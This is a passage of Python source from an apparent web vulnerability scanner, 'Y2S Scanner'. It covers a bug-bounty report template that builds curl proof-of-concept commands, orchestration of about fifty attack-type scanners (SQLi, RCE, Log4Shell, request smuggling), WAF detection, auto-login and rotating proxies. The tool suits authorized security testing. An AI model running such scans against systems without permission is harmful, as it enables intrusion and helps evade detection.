            curl_cmd = f'curl -ik "{vuln.url}" --data-urlencode "{p0}={vuln.payload_used or ""}"'

        return f"""# {vuln.vulnerability_type.value} in `{vuln.url}`

## Summary

A **{vuln.vulnerability_type.value}** vulnerability was discovered at:

```
URL:       {vuln.url}
Parameter: {param}
```

---

## Severity

| Field       | Value |
|-------------|-------|
| Severity    | **{h1sev.capitalize()}** |
| CVSS Score  | **{cvss["score"]} ({cvss["rating"]})** |
| CVSS Vector | `{cvss["vector"]}` |
| CWE         | {cwe} |

---

## Steps to Reproduce

1. Navigate to: `{vuln.url}`
2. Inject into parameter `{param}`:
   ```
   {vuln.payload_used or "See PoC below"}
   ```
3. Observe the response — evidence:
   > {vuln.evidence or "See evidence section"}

---

## Proof of Concept

```bash
{curl_cmd}
```

**Payload:** `{vuln.payload_used or "N/A"}`

**Evidence:**
```
{vuln.evidence or "N/A"}
```

---

## Impact

{vuln.impact or "This vulnerability could lead to unauthorized access or data exposure."}

---

## Remediation

{remedy}

---

## References

- https://owasp.org/www-project-top-ten/
- https://portswigger.net/web-security

---

*Generated by Y2S Scanner | {ts} | Authorized testing only.*
"""

    @classmethod
    def save_report(cls, vuln, target_url, output_dir, program_name="TARGET_PROGRAM"):
        report_md = cls.generate_report(vuln, target_url, program_name)
        output_dir = Path(output_dir)
        output_dir.mkdir(parents=True, exist_ok=True)
        domain = urllib.parse.urlparse(target_url).netloc.replace(":","_").replace("www.","")
        vtype  = re.sub(r"[^a-zA-Z0-9]","_",vuln.vulnerability_type.value)[:30]
        ts     = datetime.now().strftime("%H%M%S")
        fname  = output_dir / f"H1_{domain}_{vtype}_{ts}.md"
        fname.write_text(report_md, encoding="utf-8")
        return fname


class ComprehensiveScanner:
    def __init__(self, config: Config, cli: CLI):
        self.config = config
        self.cli = cli
        self.vt_api = VirusTotalAPI(config)
        self.sqli_scanner = SQLInjectionScanner(config)
        self.xss_scanner = XSSScanner(config)
        self.idor_scanner = IDORScanner(config)
        self.csrf_scanner = CSRFScanner(config)
        self.rce_scanner = RCEScanner(config)
        self.lfi_scanner = LFIScanner(config)
        self.rfi_scanner = RFIScanner(config)
        self.ssrf_scanner = SSRFScanner(config)
        self.fileupload_scanner = FileUploadScanner(config)
        self.secmisconf_scanner = SecurityMisconfigScanner(config)
        self.sdt_scanner = SubdomainTakeoverScanner(config)
        self.openredirect_scanner = OpenRedirectScanner(config)
        self.cors_scanner = CORSScanner(config)
        self.hostheader_scanner = HostHeaderScanner(config)
        self.xxe_scanner = XXEScanner(config)
        self.dirlist_scanner = DirectoryListingScanner(config)
        self.jwt_scanner = JWTScanner(config)
        self.graphql_scanner = GraphQLScanner(config)
        self.crlf_scanner = CRLFScanner(config)
        self.prototype_scanner = PrototypePollutionScanner(config)
        self.deserial_scanner = InsecureDeserializationScanner(config)
        self.bizlogic_scanner = BusinessLogicScanner(config)
        self.race_scanner = RaceConditionScanner(config)
        self.clickjacking_scanner = ClickjackingScanner(config)
        self.sensitive_scanner = SensitiveDataScanner(config)
        self.hpp_scanner = HPPScanner(config)
        self.enum_scanner = AccountEnumerationScanner(config)
        self.mfa_scanner = MFABypassScanner(config)
        self.smuggling_scanner = HTTPSmugglingScanner(config)

        self.ssti_scanner     = SSTIScanner(config)
        self.nosqli_scanner   = NoSQLiScanner(config)
        self.massassign_scanner = MassAssignmentScanner(config)
        self.jwt_conf_scanner = JWTConfusionScanner(config)
        self.cache_scanner    = CachePoisoningScanner(config)
        self.ws_scanner       = WebSocketScanner(config)
        self.path_trav_scanner= PathTraversalScanner(config)
        self.api_ver_scanner  = APIVersioningScanner(config)
        self.bopla_scanner    = BOPLAScanner(config)
        self.ldap_scanner     = LDAPInjectionScanner(config)
        self.xml_scanner      = XMLInjectionScanner(config)
        self.verb_scanner     = VerbTamperingScanner(config)
        self.shellshock_scanner = ShellshockScanner(config)
        self.log4shell_scanner  = Log4ShellScanner(config)
        self.spring_scanner   = Spring4ShellScanner(config)
        self.ssi_scanner      = SSIScanner(config)
        self.csti_scanner     = CSTIScanner(config)
        self.verifier      = VulnVerifier(config)
        self.rldos_checker = RateLimitDoSChecker(config, cli.console if cli else None)

    async def comprehensive_scan(
        self,
        url: str,
        include_vt: bool = True,
        include_sqli: bool = True,
        include_xss: bool = True,
        include_idor: bool = False,
        include_csrf: bool = False,
        include_rce: bool = False,
        include_lfi: bool = False,
        include_rfi: bool = False,
        include_ssrf: bool = False,
        include_fileupload: bool = False,
        include_secmisconf: bool = False,
        include_sdt: bool = False,
        include_openredirect: bool = False,
        include_cors: bool = False,
        include_hostheader: bool = False,
        include_xxe: bool = False,
        include_dirlist: bool = False,
        include_jwt: bool = False,
        include_graphql: bool = False,
        include_crlf: bool = False,
        include_prototype: bool = False,
        include_deserial: bool = False,
        include_bizlogic: bool = False,
        include_race: bool = False,
        include_clickjacking: bool = False,
        include_sensitive: bool = False,
        include_hpp: bool = False,
        include_enum: bool = False,
        include_mfa: bool = False,
        include_smuggling: bool = False,
        include_ssti: bool = False,
        include_nosqli: bool = False,
        include_massassign: bool = False,
        include_jwt_conf: bool = False,
        include_cache: bool = False,
        include_ws: bool = False,
        include_path_trav: bool = False,
        include_api_ver: bool = False,
        include_bopla: bool = False,
        include_ldap: bool = False,
        include_xml: bool = False,
        include_verb: bool = False,
        include_shellshock: bool = False,
        include_log4shell: bool = False,
        include_spring: bool = False,
        include_ssi: bool = False,
        include_csti: bool = False,
    ) -> ComprehensiveScanResult:

        result = ComprehensiveScanResult(
            url=url,
            timestamp=datetime.now().isoformat()
        )

        async with RateLimitedClient(self.config) as client:
            if include_vt and self.vt_api.enabled:
                result.virustotal = await self.vt_api.scan_url(client, url)
            if include_sqli:
                result.sqli_vulnerabilities = await self.sqli_scanner.scan_url(client, url)
            if include_xss:
                result.xss_vulnerabilities = await self.xss_scanner.scan_url(client, url)
            if include_idor:
                result.idor_vulnerabilities = await self.idor_scanner.scan_url(client, url)
            if include_csrf:
                result.csrf_vulnerabilities = await self.csrf_scanner.scan_url(client, url)
            if include_rce:
                result.rce_vulnerabilities = await self.rce_scanner.scan_url(client, url)
            if include_lfi:
                result.lfi_vulnerabilities = await self.lfi_scanner.scan_url(client, url)
            if include_rfi:
                result.rfi_vulnerabilities = await self.rfi_scanner.scan_url(client, url)
            if include_ssrf:
                result.ssrf_vulnerabilities = await self.ssrf_scanner.scan_url(client, url)
            if include_fileupload:
                result.fileupload_vulnerabilities = await self.fileupload_scanner.scan_url(client, url)
            if include_secmisconf:
                result.secmisconf_vulnerabilities = await self.secmisconf_scanner.scan_url(client, url)
            if include_sdt:
                result.sdt_vulnerabilities = await self.sdt_scanner.scan_url(client, url)
            if include_openredirect:
                result.openredirect_vulnerabilities = await self.openredirect_scanner.scan_url(client, url)
            if include_cors:
                result.cors_vulnerabilities = await self.cors_scanner.scan_url(client, url)
            if include_hostheader:
                result.hostheader_vulnerabilities = await self.hostheader_scanner.scan_url(client, url)
            if include_xxe:
                result.xxe_vulnerabilities = await self.xxe_scanner.scan_url(client, url)
            if include_dirlist:
                result.dirlist_vulnerabilities = await self.dirlist_scanner.scan_url(client, url)
            if include_jwt:
                result.jwt_vulnerabilities = await self.jwt_scanner.scan_url(client, url)
            if include_graphql:
                result.graphql_vulnerabilities = await self.graphql_scanner.scan_url(client, url)
            if include_crlf:
                result.crlf_vulnerabilities = await self.crlf_scanner.scan_url(client, url)
            if include_prototype:
                result.prototype_vulnerabilities = await self.prototype_scanner.scan_url(client, url)
            if include_deserial:
                result.deserial_vulnerabilities = await self.deserial_scanner.scan_url(client, url)
            if include_bizlogic:
                result.bizlogic_vulnerabilities = await self.bizlogic_scanner.scan_url(client, url)
            if include_race:
                result.race_vulnerabilities = await self.race_scanner.scan_url(client, url)
            if include_clickjacking:
                result.clickjacking_vulnerabilities = await self.clickjacking_scanner.scan_url(client, url)
            if include_sensitive:
                result.sensitive_vulnerabilities = await self.sensitive_scanner.scan_url(client, url)
            if include_hpp:
                result.hpp_vulnerabilities = await self.hpp_scanner.scan_url(client, url)
            if include_enum:
                result.enum_vulnerabilities = await self.enum_scanner.scan_url(client, url)
            if include_mfa:
                result.mfa_vulnerabilities = await self.mfa_scanner.scan_url(client, url)
            if include_smuggling:
                result.smuggling_vulnerabilities = await self.smuggling_scanner.scan_url(client, url)

            if include_ssti:
                result.ssti_vulns       = await self.ssti_scanner.scan_url(client, url)
            if include_nosqli:
                result.nosqli_vulns     = await self.nosqli_scanner.scan_url(client, url)
            if include_massassign:
                result.massassign_vulns = await self.massassign_scanner.scan_url(client, url)
            if include_jwt_conf:
                result.jwt_conf_vulns   = await self.jwt_conf_scanner.scan_url(client, url)
            if include_cache:
                result.cache_vulns      = await self.cache_scanner.scan_url(client, url)
            if include_ws:
                result.websocket_vulns  = await self.ws_scanner.scan_url(client, url)
            if include_path_trav:
                result.path_trav_vulns  = await self.path_trav_scanner.scan_url(client, url)
            if include_api_ver:
                result.api_abuse_vulns  = await self.api_ver_scanner.scan_url(client, url)
            if include_bopla:
                result.bopla_vulns      = await self.bopla_scanner.scan_url(client, url)
            if include_ldap:
                result.ldap_vulns       = await self.ldap_scanner.scan_url(client, url)
            if include_xml:
                result.xml_vulns        = await self.xml_scanner.scan_url(client, url)
            if include_verb:
                result.verb_vulns       = await self.verb_scanner.scan_url(client, url)
            if include_shellshock:
                result.shellshock_vulns = await self.shellshock_scanner.scan_url(client, url)
            if include_log4shell:
                result.log4shell_vulns  = await self.log4shell_scanner.scan_url(client, url)
            if include_spring:
                result.spring_vulns     = await self.spring_scanner.scan_url(client, url)
            if include_ssi:
                result.ssi_vulns        = await self.ssi_scanner.scan_url(client, url)
            if include_csti:
                result.csti_vulns       = await self.csti_scanner.scan_url(client, url)

        result.overall_verdict = self._determine_overall_verdict(result)
        return result

    def _determine_overall_verdict(self, result: ComprehensiveScanResult) -> Verdict:
        all_vulns = (
            (result.sqli_vulnerabilities or []) +
            (result.xss_vulnerabilities or []) +
            (result.idor_vulnerabilities or []) +
            (result.csrf_vulnerabilities or []) +
            (result.rce_vulnerabilities or []) +
            (result.lfi_vulnerabilities or []) +
            (result.rfi_vulnerabilities or []) +
            (result.ssrf_vulnerabilities or []) +
            (result.fileupload_vulnerabilities or []) +
            (result.secmisconf_vulnerabilities or []) +
            (result.sdt_vulnerabilities or []) +
            (result.openredirect_vulnerabilities or []) +
            (result.cors_vulnerabilities or []) +
            (result.hostheader_vulnerabilities or []) +
            (result.xxe_vulnerabilities or []) +
            (result.dirlist_vulnerabilities or []) +
            (result.jwt_vulnerabilities or []) +
            (result.graphql_vulnerabilities or []) +
            (result.crlf_vulnerabilities or []) +
            (result.prototype_vulnerabilities or []) +
            (result.deserial_vulnerabilities or []) +
            (result.bizlogic_vulnerabilities or []) +
            (result.race_vulnerabilities or []) +
            (result.clickjacking_vulnerabilities or []) +
            (result.sensitive_vulnerabilities or []) +
            (result.hpp_vulnerabilities or []) +
            (result.enum_vulnerabilities or []) +
            (result.mfa_vulnerabilities or []) +
            (result.smuggling_vulnerabilities or []) +
            (result.ssti_vulns or []) +
            (result.nosqli_vulns or []) +
            (result.massassign_vulns or []) +
            (result.jwt_conf_vulns or []) +
            (result.cache_vulns or []) +
            (result.websocket_vulns or []) +
            (result.path_trav_vulns or []) +
            (result.api_abuse_vulns or []) +
            (result.bopla_vulns or []) +
            (result.ldap_vulns or []) +
            (result.xml_vulns or []) +
            (result.verb_vulns or []) +
            (result.shellshock_vulns or []) +
            (result.log4shell_vulns or []) +
            (result.spring_vulns or []) +
            (result.ssi_vulns or []) +
            (result.csti_vulns or [])
        )


        # Critical/High vulns → VULNERABLE regardless of VT
        critical_high = [v for v in all_vulns if v.severity in ('CRITICAL', 'HIGH')]
        if critical_high:
            return Verdict.VULNERABLE

        # VT verdict takes priority for malicious/suspicious
        if result.virustotal and not result.virustotal.error:
            if result.virustotal.verdict == Verdict.MALICIOUS:
                return Verdict.MALICIOUS
            if result.virustotal.verdict == Verdict.SUSPICIOUS:
                # Only SUSPICIOUS if no low-severity vulns confirm a real issue
                return Verdict.SUSPICIOUS if not all_vulns else Verdict.VULNERABLE

        # Low/Medium vulns only → SUSPICIOUS (not full VULNERABLE)
        if all_vulns:
            return Verdict.SUSPICIOUS

        # VT says safe → SAFE
        if result.virustotal and result.virustotal.verdict == Verdict.SAFE:
            return Verdict.SAFE

        # At least one scan ran and found nothing → SAFE
        scans_ran = any([
            result.sqli_vulnerabilities is not None,
            result.xss_vulnerabilities is not None,
            result.rce_vulnerabilities is not None,
            result.lfi_vulnerabilities is not None,
        ])
        if scans_ran:
            return Verdict.SAFE

        return Verdict.UNKNOWN

    async def scan_multiple(
        self,
        urls: List[str],
        include_vt: bool = True,
        include_sqli: bool = True,
        include_xss: bool = True,
        include_idor: bool = False,
        include_csrf: bool = False,
        include_rce: bool = False,
        include_lfi: bool = False,
        include_rfi: bool = False,
        include_ssrf: bool = False,
        include_fileupload: bool = False,
        include_secmisconf: bool = False,
        include_sdt: bool = False,
        include_openredirect: bool = False,
        include_cors: bool = False,
        include_hostheader: bool = False,
        include_xxe: bool = False,
        include_dirlist: bool = False,
        include_jwt: bool = False,
        include_graphql: bool = False,
        include_crlf: bool = False,
        include_prototype: bool = False,
        include_deserial: bool = False,
        include_bizlogic: bool = False,
        include_race: bool = False,
        include_clickjacking: bool = False,
        include_sensitive: bool = False,
        include_hpp: bool = False,
        include_enum: bool = False,
        include_mfa: bool = False,
        include_smuggling: bool = False,
        include_ssti: bool = False,
        include_nosqli: bool = False,
        include_massassign: bool = False,
        include_jwt_conf: bool = False,
        include_cache: bool = False,
        include_ws: bool = False,
        include_path_trav: bool = False,
        include_api_ver: bool = False,
        include_bopla: bool = False,
        include_ldap: bool = False,
        include_xml: bool = False,
        include_verb: bool = False,
        include_shellshock: bool = False,
        include_log4shell: bool = False,
        include_spring: bool = False,
        include_ssi: bool = False,
        include_csti: bool = False,
    ) -> List[ComprehensiveScanResult]:
        results = []
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
                      BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                      console=self.cli.console) as progress:
            task = progress.add_task("Scanning URLs...", total=len(urls))
            for i, url in enumerate(urls, 1):
                progress.update(task, description=f"Scanning {i}/{len(urls)}: {url[:40]}...", completed=i-1)
                result = await self.comprehensive_scan(
                    url, include_vt, include_sqli, include_xss,
                    include_idor, include_csrf, include_rce,
                    include_lfi, include_rfi, include_ssrf,
                    include_fileupload, include_secmisconf, include_sdt,
                    include_openredirect, include_cors, include_hostheader,
                    include_xxe, include_dirlist,
                    include_jwt, include_graphql, include_crlf,
                    include_prototype, include_deserial, include_bizlogic,
                    include_race, include_clickjacking,
                    include_sensitive, include_hpp, include_enum,
                    include_mfa, include_smuggling,
                    include_ssti, include_nosqli, include_massassign,
                    include_jwt_conf, include_cache, include_ws,
                    include_path_trav, include_api_ver, include_bopla,
                    include_ldap, include_xml, include_verb,
                    include_shellshock, include_log4shell, include_spring,
                    include_ssi, include_csti,
                )
                results.append(result)
                if i < len(urls):
                    await asyncio.sleep(2)
                progress.update(task, completed=i)
        return results

async def main():
    cli = CLI()

    try:
        config = Config()
    except ValueError as e:
        cli.console.print(f"[red]Configuration Error:[/red] {e}")
        sys.exit(1)

    scanner      = ComprehensiveScanner(config, cli)
    proxy_manager = ProxyManager(config, cli.console)
    apply_config_headers(config)

    cli.show_banner()

    if not config.api_key:
        cli.console.print("[yellow]  VirusTotal API key not configured. VT scans will be skipped.[/yellow]")
        cli.console.print("[dim]Set VT_API_KEY environment variable or create config.json to enable VT scanning.[/dim]\n")

    def run_scan(result):
        beep(2)
        # ── Collect all vulns across all scan types ───────────────────────────
        _all_fields = [
            'sqli_vulnerabilities','xss_vulnerabilities','idor_vulnerabilities',
            'csrf_vulnerabilities','rce_vulnerabilities','lfi_vulnerabilities',
            'rfi_vulnerabilities','ssrf_vulnerabilities','fileupload_vulnerabilities',
            'secmisconf_vulnerabilities','sdt_vulnerabilities','openredirect_vulnerabilities',
            'cors_vulnerabilities','hostheader_vulnerabilities','xxe_vulnerabilities',
            'dirlist_vulnerabilities','jwt_vulnerabilities','graphql_vulnerabilities',
            'prototype_vulnerabilities','crlf_vulnerabilities','deserial_vulnerabilities',
            'bizlogic_vulnerabilities','race_vulnerabilities','clickjacking_vulnerabilities',
            'sensitive_vulnerabilities','hpp_vulnerabilities','enum_vulnerabilities',
            'mfa_vulnerabilities','smuggling_vulnerabilities',
            'ssti_vulns','nosqli_vulns','massassign_vulns','jwt_conf_vulns',
            'cache_vulns','websocket_vulns','path_trav_vulns','api_abuse_vulns',
            'bopla_vulns','ldap_vulns','xml_vulns','verb_vulns','shellshock_vulns',
            'log4shell_vulns','spring_vulns','ssi_vulns','csti_vulns',
        ]
        all_found = []
        for _f in _all_fields:
            all_found.extend(getattr(result, _f, None) or [])

        if not all_found and result.overall_verdict in (Verdict.SAFE, Verdict.UNKNOWN):
            # Nothing found — print minimal one-liner
            vc = cli._get_verdict_color(result.overall_verdict)
            cli.console.print(
                f"[{vc}]  ✔ {result.url[:70]} → {result.overall_verdict.value}[/{vc}]"
            )
            rd, rp = FileHandler.auto_save([result])
            cli.console.print(f"[dim]  ✔ Saved → {rd}[/dim]")
            return

        # ── Tree display — only vuln branches shown ───────────────────────────
        cli.display_comprehensive_result(result)

        # ── PoC Block ─────────────────────────────────────────────────────────
        if all_found:
            cli.console.print("[bold cyan]╔══════ PoC Payloads ══════════════════════════════════╗[/bold cyan]")
            for i, v in enumerate(all_found, 1):
                sc = {"CRITICAL":"bold red","HIGH":"red","MEDIUM":"yellow","LOW":"dim"}.get(v.severity,"white")
                cvss_info = CVSSScorer.score(v)
                cli.console.print(f"  [{sc}][{v.severity}] {v.subtype or v.vulnerability_type.value}[/{sc}]  [dim]CVSS {cvss_info['score']} ({cvss_info['rating']})[/dim]")
                cli.console.print(f"  [dim]  URL    : {v.url}[/dim]")
                cli.console.print(f"  [dim]  Param  : {', '.join(v.vulnerable_params)}[/dim]")
                cli.console.print(f"  [bold yellow]  PoC    : {v.payload_used}[/bold yellow]")
                if v.evidence:
                    cli.console.print(f"  [dim]  Proof  : {v.evidence[:120]}[/dim]")
                cli.console.print()
            cli.console.print("[bold cyan]╚═══════════════════════════════════════════════════════╝[/bold cyan]\n")

        rd, rp = FileHandler.auto_save([result])
        cli.console.print(f"[green]✔ JSON   → {rd}[/green]")
        cli.console.print(f"[green]✔ Report → {rp}[/green]")
        # Auto H1 reports for CRITICAL/HIGH ──────────────────────────────
        try:
            _h1_dir = rd.parent / "h1_reports"
            _h1_attrs = ["sqli_vulnerabilities","xss_vulnerabilities","rce_vulnerabilities",
                         "lfi_vulnerabilities","ssrf_vulnerabilities","ssti_vulns",
                         "nosqli_vulns","shellshock_vulns","log4shell_vulns","spring_vulns"]
            for _attr in _h1_attrs:
                for _v in (getattr(result, _attr, None) or []):
                    if _v.severity in ("CRITICAL","HIGH"):
                        try:
                            HackerOneReportGenerator.save_report(_v, result.url, _h1_dir)
                        except Exception:
                            pass
        except Exception:
            pass
        # ── HTML report ───────────────────────────────────────────────────────
        try:
            domain   = FileHandler.domain_from_url(result.url)
            ts_str   = result.timestamp.replace(':', '-').replace('.', '-')[:19]
            html_path= str(rd / f"{domain}_{ts_str}.html")
            HTMLReportGenerator.generate([result], html_path)
            cli.console.print(f"[green]✔ HTML   → {html_path}[/green]")
        except Exception:
            pass

    def ask_ua():
        global _custom_ua
        current = f" (current: {_custom_ua})" if _custom_ua else " (current: random)"
        cli.console.print(f"[dim]Custom User-Agent{current} — press Enter to keep: [/dim]", end="")
        ua = input().strip()
        if ua:
            _custom_ua = ua
            cli.console.print(f"[green]✔ User-Agent set: {ua}[/green]")

    health_checker  = TargetHealthChecker(cli.console)
    crawler         = WebCrawler(cli.console)
    waf_detector    = WAFDetector(config, cli.console)
    param_discovery = ParamDiscovery(config)
    dir_bruter      = DirBruter(config)
    subdomain_enum  = SubdomainEnum(config, cli.console)
    recon_scanner   = ReconAndDisclosureScanner(config, cli.console)
    auth_scanner    = AuthScanner(config)
    cvss            = CVSSScorer()
    poc_gen         = PoCGenerator()
    blind_sql       = BlindSQLExtractor(config)

    def show_settings():
        cli.console.print("\n[bold cyan]╔══════════════════════════════════════════╗[/bold cyan]")
        cli.console.print("[bold cyan]║           Y2S — Settings                ║[/bold cyan]")
        cli.console.print("[bold cyan]╚══════════════════════════════════════════╝[/bold cyan]")
        cli.console.print(f"  [1] Concurrency    : [cyan]{config.concurrency}[/cyan]")
        cli.console.print(f"  [2] Request delay  : [cyan]{config.req_delay}s {'(random)' if config.req_delay_random else ''}[/cyan]")
        cli.console.print(f"  [3] Proxy          : [cyan]{config.proxy or 'none'}[/cyan]")
        proxy_info = (f"{len(config.proxy_list)} proxies loaded from {config.proxy_file}"
                      if config.proxy_list else "no file loaded")
        cli.console.print(f"  [10] Proxy file    : [cyan]{proxy_info}[/cyan]")
        cli.console.print(f"  [4] Cookies        : [cyan]{json.dumps(config.cookies) if config.cookies else 'none'}[/cyan]")
        cli.console.print(f"  [5] Auth header    : [cyan]{config.auth_header or 'none'}[/cyan]")
        cli.console.print(f"  [6] Login URL      : [cyan]{config.login_url or 'not set'}[/cyan]")
        cli.console.print(f"  [7] Login data     : [cyan]{json.dumps(config.login_data) if config.login_data else 'not set'}[/cyan]")
        cli.console.print("  [0] Back")
        cli.console.print("  [dim]──────────────────────────────────────────[/dim]")
        cli.console.print("  [10] 📂 Proxy file  — load & test proxies from file")
        while True:
            raw = input("\nSetting to change (0-10): ").strip()
            if raw == '0': break
            elif raw == '1':
                v = input("Concurrency (1-50): ").strip()
                if v.isdigit() and 1 <= int(v) <= 50:
                    config.concurrency = int(v)
                    cli.console.print(f"[green]✔ Concurrency: {config.concurrency}[/green]")
            elif raw == '2':
                v = input("Delay between requests in seconds (0 = none): ").strip()
                try:
                    config.req_delay = float(v)
                    rnd = input("Randomize delay? (y/n): ").strip().lower()
                    config.req_delay_random = rnd == 'y'
                    cli.console.print(f"[green]✔ Delay: {config.req_delay}s {'(random)' if config.req_delay_random else ''}[/green]")
                except ValueError:
                    pass
            elif raw == '3':
                v = input("Proxy URL (e.g. http://127.0.0.1:8080, blank = none): ").strip()
                config.proxy = v or None
                cli.console.print(f"[green]✔ Proxy: {config.proxy or 'disabled'}[/green]")
            elif raw == '4':
                v = input("Cookie string (name=val; name2=val2) or blank: ").strip()
                if v:
                    config.cookies = dict(p.split('=',1) for p in v.split(';') if '=' in p)
                    cli.console.print(f"[green]✔ Cookies set[/green]")
                else:
                    config.cookies = {}
                    cli.console.print("[green]✔ Cookies cleared[/green]")
            elif raw == '5':
                v = input("Authorization header value (e.g. Bearer <token>): ").strip()
                config.auth_header = v or None
                cli.console.print(f"[green]✔ Auth header: {config.auth_header or 'cleared'}[/green]")
            elif raw == '6':
                config.login_url = input("Login URL: ").strip() or None
                cli.console.print(f"[green]✔ Login URL: {config.login_url}[/green]")
            elif raw == '7':
                cli.console.print("[dim]Enter login fields as: field1=value1 field2=value2[/dim]")
                v = input("Login data: ").strip()
                if v:
                    config.login_data = dict(p.split('=',1) for p in v.split() if '=' in p)
                    cli.console.print(f"[green]✔ Login data: {config.login_data}[/green]")
            elif raw == '8':
                hname = input("Scope header name  (e.g. X-Bug-Bounty): ").strip()
                hval  = input("Scope header value : ").strip()
                if hname:
                    config.scope_header_name  = hname
                    config.scope_header_value = hval
                    config.custom_request_headers[hname] = hval
                    apply_config_headers(config)
                    cli.console.print(f"[green]✔ Scope header set: {hname}: {hval}[/green]")
            elif raw == '9':
                cli.console.print("[dim]Extra headers: name=value one per line. Blank to finish:[/dim]")
                while True:
                    line = input().strip()
                    if not line: break
                    if '=' in line:
                        k, v = line.split('=',1)
                        config.custom_request_headers[k.strip()] = v.strip()
                apply_config_headers(config)
                cli.console.print(f"[green]✔ Custom headers: {config.custom_request_headers}[/green]")
            elif raw == '10':
                cli.console.print("\n[bold cyan]📂 Proxy File Loader[/bold cyan]")
                cli.console.print("[dim]Format: one proxy per line — http://ip:port  or  socks5://ip:port[/dim]")
                cli.console.print("[dim]Lines starting with # are ignored.[/dim]\n")
                fp = input("Proxy file path: ").strip()
                if not fp:
                    cli.console.print("[yellow]No path entered.[/yellow]")
                elif not Path(fp).exists():
                    cli.console.print(f"[red]✗ File not found: {fp}[/red]")
                else:
                    lat_raw = input("Max latency per proxy in seconds (default 5): ").strip()
                    max_lat = float(lat_raw) if lat_raw.replace('.','').isdigit() else 5.0
                    con_raw = input("Test concurrency (default 10): ").strip()
                    max_con = int(con_raw) if con_raw.isdigit() else 10
                    pm = ProxyManager(config, cli.console)
                    n  = pm.load_and_apply(fp, max_latency=max_lat)
                    if n:
                        cli.console.print(f"[green]✔ {n} working proxies ready — rotating per request.[/green]")
                        cli.console.print(f"[dim]Fastest proxy: {config.proxy_list[0]}[/dim]")
                        # Show proxy rotation preview
                        preview = Table(box=box.SIMPLE)
                        preview.add_column("#", width=4)
                        preview.add_column("Proxy", width=40)
                        for idx, px in enumerate(config.proxy_list[:10], 1):
                            preview.add_row(str(idx), px)
                        if len(config.proxy_list) > 10:
                            preview.add_row("...", f"(+{len(config.proxy_list)-10} more)")
                        cli.console.print(preview)
            show_settings()
            break

    async def check_target(url: str) -> bool:
        # ── Show active proxy ──────────────────────────────────────────────
        if config.proxy_list:
            cur_px = config.proxy_list[config.proxy_index % len(config.proxy_list)]
            cli.console.print(
                f"[dim]🔀 Proxy [{config.proxy_index+1}/{len(config.proxy_list)}]: {cur_px}[/dim]"
            )
        elif config.proxy:
            cli.console.print(f"[dim]🔀 Proxy: {config.proxy}[/dim]")
        # ── WAF detection ─────────────────────────────────────────────────
        waf = await waf_detector.detect(url)
        if waf["detected"]:
            wc = "red" if waf["confidence"] == "high" else "yellow"
            cli.console.print(f"[{wc}]⚠ WAF detected: {waf['waf'] or 'Unknown'} (confidence: {waf['confidence']})[/{wc}]")
            cli.console.print(f"[dim]  {waf['details']}[/dim]")
        # ── Auto-login if configured ───────────────────────────────────────
        if config.login_url and config.login_data and not config.cookies:
            cli.console.print("[dim]  Logging in...[/dim]")
            cookies = await auth_scanner.login(
                config.login_url, config.login_data, config.login_success_pattern)
            if cookies:
                config.cookies = cookies
                cli.console.print(f"[green]  ✔ Logged in — {len(cookies)} cookie(s) set[/green]")
            else:
                cli.console.print("[yellow]  ⚠ Login failed — scanning without session[/yellow]")
        h = await health_checker.check(url)
        return h["proceed"]

    async def get_scan_urls(base_url: str) -> list:
        """
        If URL has no params, crawl the site first to discover targets.
        Always returns at least [base_url].
        """
        parsed = urllib.parse.urlparse(base_url)
        has_params = bool(parsed.query)
        if has_params:
            return [base_url]  # URL already has params — no need to crawl
        # No params — run crawler
        crawl_results = await crawler.crawl(base_url)
        urls = crawler.get_all_scan_urls(crawl_results)
        if base_url not in urls:
            urls.insert(0, base_url)
        cli.console.print(f"[cyan]  Scanning {len(urls)} discovered URLs...[/cyan]\n")
        return urls

    while True:
        mode = cli.get_scan_mode()

        if mode == '0':
            cli.console.print("\n[cyan]Exiting... Stay secure![/cyan]")
            break

        ask_ua()

        if mode == '1':
            url = cli.get_single_url()
            if not await check_target(url):
                continue
            scan_urls = await get_scan_urls(url)
            for su in scan_urls:
                result = await scanner.comprehensive_scan(su)
                run_scan(result)

        elif mode == '2':
            file_path = cli.get_file_path()
            try:
                urls = FileHandler.read_targets(file_path)
                if not urls:
                    cli.console.print("[red]No valid URLs found.[/red]")
                    continue
                cli.console.print(f"\n[cyan]Found {len(urls)} URL(s).[/cyan]")
                cli.console.print("\n[bold cyan]Select scans (Enter = all):[/bold cyan]")
                cli.console.print("  [1]SQLi  [2]XSS   [3]RCE   [4]LFI   [5]RFI   [6]XXE   [7]CRLF")
                cli.console.print("  [8]IDOR  [9]CSRF  [10]JWT  [11]BizLogic [12]Enum [13]2FA")
                cli.console.print("  [14]SSRF [15]Redirect [16]HostHdr [17]Proto [18]Deserial [19]Race [20]Smuggling")
                cli.console.print("  [21]Misconfig [22]DirList [23]CORS [24]Clickjack [25]Upload [26]SDT [27]GraphQL")
                cli.console.print("  [28]Sensitive [29]HPP [30]VT")
                cli.console.print("  [31]SSTI [32]NoSQLi [33]LDAP [34]XML [35]SSI [36]CSTI")
                cli.console.print("  [37]MassAssign [38]BOPLA [39]APIVer [40]Cache [41]WS [42]PathTrav [43]Verb")
                cli.console.print("  [44]JWTConf [45]Shellshock [46]Log4Shell [47]Spring4Shell")
                raw = input("Choice: ").strip()
                chosen = set(raw.split()) if raw else {str(i) for i in range(1, 48)}
                results = await scanner.scan_multiple(
                    urls,
                    include_sqli='1' in chosen,           include_xss='2' in chosen,
                    include_rce='3' in chosen,             include_lfi='4' in chosen,
                    include_rfi='5' in chosen,             include_xxe='6' in chosen,
                    include_crlf='7' in chosen,            include_idor='8' in chosen,
                    include_csrf='9' in chosen,            include_jwt='10' in chosen,
                    include_bizlogic='11' in chosen,       include_enum='12' in chosen,
                    include_mfa='13' in chosen,            include_ssrf='14' in chosen,
                    include_openredirect='15' in chosen,   include_hostheader='16' in chosen,
                    include_prototype='17' in chosen,      include_deserial='18' in chosen,
                    include_race='19' in chosen,           include_smuggling='20' in chosen,
                    include_secmisconf='21' in chosen,     include_dirlist='22' in chosen,
                    include_cors='23' in chosen,           include_clickjacking='24' in chosen,
                    include_fileupload='25' in chosen,     include_sdt='26' in chosen,
                    include_graphql='27' in chosen,        include_sensitive='28' in chosen,
                    include_hpp='29' in chosen,            include_vt='30' in chosen,
                    include_ssti='31' in chosen,           include_nosqli='32' in chosen,
                    include_ldap='33' in chosen,           include_xml='34' in chosen,
                    include_ssi='35' in chosen,            include_csti='36' in chosen,
